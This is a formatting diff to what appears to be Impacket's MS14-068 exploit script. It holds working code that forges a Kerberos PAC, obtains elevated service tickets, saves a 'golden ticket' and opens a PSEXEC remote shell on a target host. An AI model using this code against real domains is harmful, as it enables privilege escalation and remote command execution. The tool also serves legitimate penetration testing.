@@ -365,19 +365,27 @@ class PSEXEC:
             LastDataSent = ''
 
             # Create the pipes threads
-            stdin_pipe  = RemoteStdInPipe(rpctransport,'\%s%s%d' % (RemComSTDIN ,packet['Machine'],packet['ProcessID']), smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, self.__TGS, installService.getShare() )
+            stdin_pipe = RemoteStdInPipe(rpctransport,
+                                         '\%s%s%d' % (RemComSTDIN, packet['Machine'], packet['ProcessID']),
+                                         smb.FILE_WRITE_DATA | smb.FILE_APPEND_DATA, self.__TGS,
+                                         installService.getShare())
             stdin_pipe.start()
-            stdout_pipe = RemoteStdOutPipe(rpctransport,'\%s%s%d' % (RemComSTDOUT,packet['Machine'],packet['ProcessID']), smb.FILE_READ_DATA )
+            stdout_pipe = RemoteStdOutPipe(rpctransport,
+                                           '\%s%s%d' % (RemComSTDOUT, packet['Machine'], packet['ProcessID']),
+                                           smb.FILE_READ_DATA)
             stdout_pipe.start()
-            stderr_pipe = RemoteStdErrPipe(rpctransport,'\%s%s%d' % (RemComSTDERR,packet['Machine'],packet['ProcessID']), smb.FILE_READ_DATA )
+            stderr_pipe = RemoteStdErrPipe(rpctransport,
+                                           '\%s%s%d' % (RemComSTDERR, packet['Machine'], packet['ProcessID']),
+                                           smb.FILE_READ_DATA)
             stderr_pipe.start()
             
             # And we stay here till the end
             ans = s.readNamedPipe(tid,fid_main,8)
 
             if len(ans):
-               retCode = RemComResponse(ans)
-               logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
+                retCode = RemComResponse(ans)
+                logging.info("Process %s finished with ErrorCode: %d, ReturnCode: %d" % (
+                self.__command, retCode['ErrorCode'], retCode['ReturnCode']))
             installService.uninstall()
             if self.__copyFile is not None:
                 # We copied a file for execution, let's remove it
@@ -434,7 +442,8 @@ class Pipes(Thread):
         try:
             lock.acquire()
             global dialect
-            self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(), sess_port = self.port, preferredDialect = dialect)
+            self.server = SMBConnection('*SMBSERVER', self.transport.get_smb_connection().getRemoteHost(),
+                                        sess_port=self.port, preferredDialect=dialect)
             user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
             self.server.login(user, passwd, domain, lm, nt)
             lock.release()
@@ -507,7 +516,8 @@ class RemoteShell(cmd.Cmd):
         self.intro = '[!] Press help for extra shell commands'
 
     def connect_transferClient(self):
-        self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port = self.port, preferredDialect = dialect)
+        self.transferClient = SMBConnection('*SMBSERVER', self.server.getRemoteHost(), sess_port=self.port,
+                                            preferredDialect=dialect)
         user, passwd, domain, lm, nt, aesKey, TGT, TGS = self.credentials
         self.transferClient.kerberosLogin(user, passwd, domain, lm, nt, aesKey, TGS=self.TGS, useCache=False)
 
@@ -615,7 +625,8 @@ class MS14_068:
             ('Data', PKERB_VALIDATION_INFO),
         )
 
-    def __init__(self, target, targetIp = None, username = '', password = '', domain='', hashes = None, command='', copyFile=None, writeTGT=None, kdcHost=None):
+    def __init__(self, target, targetIp=None, username='', password='', domain='', hashes=None, command='',
+                 copyFile=None, writeTGT=None, kdcHost=None):
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -834,7 +845,9 @@ class MS14_068:
         #offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) /8 *8
 
         # Building the PAC_TYPE as specified in [MS-PAC]
-        buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(pacClientInfo) + pacClientInfoAlignment
+        buffers = str(validationInfoIB) + str(pacClientInfoIB) + str(serverChecksumIB) + str(
+            privSvrChecksumIB) + validationInfoBlob + validationInfoAlignment + str(
+            pacClientInfo) + pacClientInfoAlignment
         buffersTail = str(serverChecksum) + serverChecksumAlignment + str(privSvrChecksum) + privSvrChecksumAlignment
 
         pacType = PACTYPE()
@@ -1114,7 +1127,9 @@ class MS14_068:
             exception = None
             while True:
                 try:
-                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost, requestPAC=False)
+                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
+                                                                            self.__lmhash, self.__nthash, None,
+                                                                            self.__kdcHost, requestPAC=False)
                 except KerberosError, e:
                     if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                         # We might face this if the target does not support AES (most probably
@@ -1159,13 +1174,17 @@ class MS14_068:
                 encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
                 authTime = encASRepPart['authtime']
 
-                serverName = Principal('krbtgt/%s' % self.__domain.upper(), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-                tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, authTime)
+                serverName = Principal('krbtgt/%s' % self.__domain.upper(),
+                                       type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+                tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt,
+                                                                             cipher, sessionKey, authTime)
 
                 # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
                 serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
                 try:
-                    tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, domain, self.__kdcHost, tgs, cipher, sessionKey)
+                    tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, domain,
+                                                                                        self.__kdcHost, tgs, cipher,
+                                                                                        sessionKey)
                 except KerberosError, e:
                     if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                         # We might face this if the target does not support AES (most probably
@@ -1209,7 +1228,8 @@ class MS14_068:
                 s = SMBConnection('*SMBSERVER', self.__target)
             else:
                 s = SMBConnection('*SMBSERVER', self.__targetIp)
-            s.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, TGS=TGS, useCache=False)
+            s.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, TGS=TGS,
+                            useCache=False)
 
             if self.__command != 'None':
                 executer = PSEXEC(self.__command, username, domain, s, TGS, self.__copyFile)
@@ -1236,25 +1256,33 @@ if __name__ == '__main__':
     from impacket.krb5.types import Principal, Ticket, KerberosTime
     from impacket.krb5 import constants
     from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, KerberosError
-    from impacket.krb5.asn1 import AS_REP, TGS_REQ, AP_REQ, TGS_REP, Authenticator, EncASRepPart, AuthorizationData, AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, \
+    from impacket.krb5.asn1 import AS_REP, TGS_REQ, AP_REQ, TGS_REP, Authenticator, EncASRepPart, AuthorizationData, \
+        AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, \
         EncTGSRepPart, ETYPE_INFO2_ENTRY
     from impacket.krb5.crypto import Key
     from impacket.dcerpc.v5.ndr import NDRULONG
-    from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
+    from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, \
+        SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
     from pyasn1.codec.der import decoder, encoder
     from Crypto.Hash import MD5
 
     print version.BANNER
 
-    parser = argparse.ArgumentParser(add_help = True, description = "MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the target or saves the TGT for later use.")
+    parser = argparse.ArgumentParser(add_help=True,
+                                     description="MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the target or saves the TGT for later use.")
 
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName>')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    parser.add_argument('command', nargs='*', default = ' ', help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)')
-    parser.add_argument('-c', action='store',metavar = "pathname",  help='uploads the filename for later execution, arguments are passed in the command option')
-    parser.add_argument('-w', action='store',metavar = "pathname",  help='writes the golden ticket in CCache format into the <pathname> file')
-    parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller (needed to get the user''s SID). If ommited it use the domain part (FQDN) specified in the target parameter')
-    parser.add_argument('-target-ip', action='store',metavar = "ip address",  help='IP Address of the target host you want to attack. If ommited it will use the targetName parameter')
+    parser.add_argument('command', nargs='*', default=' ',
+                        help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)')
+    parser.add_argument('-c', action='store', metavar="pathname",
+                        help='uploads the filename for later execution, arguments are passed in the command option')
+    parser.add_argument('-w', action='store', metavar="pathname",
+                        help='writes the golden ticket in CCache format into the <pathname> file')
+    parser.add_argument('-dc-ip', action='store', metavar="ip address",
+                        help='IP Address of the domain controller (needed to get the user''s SID). If ommited it use the domain part (FQDN) specified in the target parameter')
+    parser.add_argument('-target-ip', action='store', metavar="ip address",
+                        help='IP Address of the target host you want to attack. If ommited it will use the targetName parameter')
 
     group = parser.add_argument_group('authentication')
 
@@ -1275,14 +1303,16 @@ if __name__ == '__main__':
     options = parser.parse_args()
 
     import re
-    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')
+
+    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
+        options.target).groups('')
 
     #In case the password contains '@'
     if '@' in address:
         password = password + '@' + address.rpartition('@')[0]
         address = address.rpartition('@')[2]
 
-    if domain is None:
+    if domain is '':
         logging.critical('Domain should be specified!')
         sys.exit(1)
 
@@ -1299,7 +1329,8 @@ if __name__ == '__main__':
     if commands == ' ':
         commands = 'cmd.exe'
 
-    dumper = MS14_068(address, options.target_ip, username, password, domain, options.hashes, commands, options.c, options.w, options.dc_ip)
+    dumper = MS14_068(address, options.target_ip, username, password, domain, options.hashes, commands, options.c,
+                      options.w, options.dc_ip)
 
     try:
         dumper.exploit()
